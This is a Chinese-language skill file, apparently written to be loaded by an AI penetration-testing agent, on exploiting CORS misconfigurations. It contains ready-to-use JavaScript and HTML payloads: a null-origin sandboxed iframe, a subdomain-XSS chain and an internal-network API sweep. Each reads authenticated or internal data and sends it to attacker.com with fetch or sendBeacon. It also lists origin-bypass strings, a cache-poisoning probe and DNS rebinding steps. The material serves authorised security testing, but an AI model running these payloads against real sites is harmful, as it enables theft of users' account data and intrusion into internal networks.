# 技能：CORS 配置错误 — 认证来源、反射和信任边界错误

> **AI 加载指令**：当浏览器可以跨域访问认证 API 时使用此技能。关注反射来源、认证请求、通配符信任、解析器错误和来源允许列表绕过。对于 JSONP 劫持的深入分析、同源策略内部机制、蜜罐去匿名化和 CORS 与 JSONP 的比较，请加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

### 扩展场景

当您需要时，也加载 [SCENARIOS.md](./SCENARIOS.md)：
- JSONP 劫持完整攻击场景 — 水坑 + `<script>` 跨域数据窃取
- 通过 JSONP 进行蜜罐去匿名化 — 使用社交平台 JSONP 端点识别匿名访客
- 同源策略深入分析 — 协议/主机名/端口定义、`document.domain` 子域放松及其安全风险
- CORS 与 JSONP 技术比较 — 方法、错误处理、凭证行为、迁移路径
- CORS 利用载荷 — 反射来源带有 `credentials: include`、通过沙盒 iframe 的空来源
- 双站攻击实验室模式 — 本地主机:8981（目标）+ 本地主机:8982（攻击者）测试设置

## 1. 何时加载此技能

加载条件：
- 响应包含 `Access-Control-Allow-Origin`、`Access-Control-Allow-Credentials` 或预检请求头
- 浏览器攻击路径可能读取认证 API 响应
- JSON 端点看似受 CSRF 保护但可跨域读取

## 2. 高价值配置错误检查

| 主题 | 检查内容 |
|---|---|
| 通配符与凭证 | `Access-Control-Allow-Origin: *` 加上凭证支持或等效错误行为 |
| 反射来源 | 服务器回显任意 `Origin` |
| 弱允许列表 | 后缀、前缀、子字符串、正则表达式或大小写混合匹配错误 |
| 空来源 | 接受沙盒、文件或序列化来源 |
| 预检信任 | 过宽的方法和请求头 |
| 内部 API 暴露 | 管理员或租户数据可跨域读取 |

## 3. 快速初步评估

1. 发送定制的 `Origin` 请求头并检查反射。
2. 带有和没有凭证进行测试。
3. 使用攻击者子域和解析器边缘情况探测允许列表绕过。
4. 如果可读数据是敏感的，链式到账户或租户影响。

## 4. 相关路径

- 会话或 JSON 动作滥用：[跨站请求伪造](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth 令牌泄露和回调绑定：[OAuth OIDC 配置错误](../oauth-oidc-misconfiguration/SKILL.md)
- API 认证上下文：[API 认证和 JWT 滥用](../api-auth-and-jwt-abuse/SKILL.md)

---

## 5. 空来源利用

### `Origin: null` 如何发送

| 上下文 | 来源请求头值 |
|---------|-------------------|
| 沙盒 iframe (`<iframe sandbox>`) | `null` |
| `data:` URI 方案 | `null` |
| `file:` 协议（本地 HTML） | `null` |
| 跨域重定向链（某些浏览器） | `null` |
| 来自不透明来源的 `blob:` URL 中的序列化数据 | `null` |

### 利用

如果服务器将其来源允许列表中包含 `null` 或反射它：

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

沙盒 iframe 发送 `Origin: null` → 服务器反射 `null` → 攻击者读取认证响应。

---

## 6. 子域 XSS → CORS 绕过链

### 攻击流程

```text
1. 目标 API 在 api.target.com 允许来自 *.target.com 的 CORS
2. 在任何子域上找到 XSS：blog.target.com、dev.target.com 等
3. 利用 XSS 对 api.target.com 发送认证请求
4. CORS 允许请求 → 攻击者读取敏感 API 响应
```

### POC（通过 blog.target.com 注入）

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://attacker.com/exfil',
        JSON.stringify(data));
});
```

### 为什么这有效

- `blog.target.com` 与 `api.target.com` 是 **同站** → 发送 `SameSite` cookie
- CORS 允许列表包含 `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- 结合：SameSite 绕过 + CORS 读取 = 从任何子域 XSS 获取完整 API 访问

### 此链的侦察

```text
□ 列出子域（amass、subfinder、crt.sh）
□ 测试每个子域是否存在 XSS（存储型、反射型、DOM 型）
□ 检查 API CORS 是否接受子域来源
□ 子域接管候选也符合条件
```

---

## 7. VARY：来源缓存问题

### 问题

当服务器在 `Access-Control-Allow-Origin` 中反射 `Origin` 但**未**在响应中包含 `Vary: Origin` 时，中介缓存（CDN、反向代理）可能会将相同的缓存响应提供给不同来源：

```text
1. 攻击者请求：Origin: https://attacker.com
   缓存使用：Access-Control-Allow-Origin: https://attacker.com

2. 受害者请求相同 URL（无 Origin 或不同 Origin）
   缓存返回响应：Access-Control-Allow-Origin: https://attacker.com
   → 受害者浏览器允许 attacker.com 读取响应（CORS 缓存中毒）
```

### 检测

```bash
# 请求 1：带有攻击者来源
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# 请求 2：带有合法来源
curl -H "Origin: https://target.com" https://target.com/api/data -I

# 比较：如果两个响应都包含 Access-Control-Allow-Origin: https://evil.com
# → 缓存中毒，缺少 Vary: Origin
```

### 利用

```text
1. 预热缓存：发送 Origin: https://attacker.com 的请求
2. 等待受害者访问相同缓存 URL
3. 缓存 ACAO 头允许 attacker.com 读取响应
4. 攻击者页面获取 URL → 读取缓存响应（带凭证）
```

### 修复验证

```text
□ 响应包含 Vary: Origin
□ 缓存键包含来源请求头
□ 或者：Access-Control-Allow-Origin 未反射（硬编码允许列表）
```

---

## 8. 正则表达式绕过模式

常见的来源验证正则表达式错误：

| 预期模式 | 缺陷 | 绕过来源 |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` 匹配任何包括 `-` 的内容 | `https://attacker-target.com` |
| `^https?://.*target\.com$` | 缺少子域后锚点 | `https://nottarget.com`、`https://attacker.com/.target.com` |
| `target\.com`（子字符串匹配） | 无锚点 | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | 缺少端口限制 | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | 缺少路径末尾锚点 | N/A（但会遗漏带有 `-` 或数字的子域） |
| 回溯易受攻击的正则 | ReDoS | `https://aaaa...aaa.target.com`（CPU 消耗） |

### 用于来源验证绕过的测试载荷

```text
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

### 高级：Unicode 规范化绕过

```text
https://target.com → https://ⓣarget.com (Unicode 同形异体字)
```

某些来源验证器在比较后规范化 Unicode，而浏览器发送原始值 — 或反之。

---

## 9. 内部网络 CORS 利用

### 场景

一个仅限内部的 API（例如 `http://192.168.1.100:8080/admin`）配置为：
```http
Access-Control-Allow-Origin: *
```

内部 API 常用通配符 CORS 因为“只有内部用户可以访问它。”

### 攻击链

```text
1. 攻击者向受害者（内部员工）发送指向 attacker.com 的链接
2. 攻击者页面 JavaScript 获取内部 API：
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS 允许 * → 响应可读
4. 将内部数据泄露到攻击者服务器
```

```javascript
// 在 attacker.com — 从受害者浏览器目标内部 API
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### 通过 CORS 定时扫描

即使没有 `Access-Control-Allow-Origin: *`，攻击者也可以推断内部服务可用性：
- **端口开放**：连接建立 → CORS 错误（不同定时）
- **端口关闭**：连接拒绝 → 快速错误
- **主机宕机**：超时 → 慢速错误

### 结合 DNS 重绑定

```text
1. 攻击者控制 attacker.com，设置短 TTL（例如 0 或 1）
2. 第一次 DNS 解析：attacker.com → 攻击者 IP（提供恶意 JS）
3. 第二次 DNS 解析：attacker.com → 192.168.1.100（内部 IP）
4. 页面上的 JavaScript 获取 attacker.com/admin → 现在命中内部服务器
5. 同源策略满足（同域）→ 响应可读
```
